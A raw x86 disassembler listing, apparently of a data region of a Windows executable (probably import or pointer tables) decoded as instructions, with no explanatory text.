  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
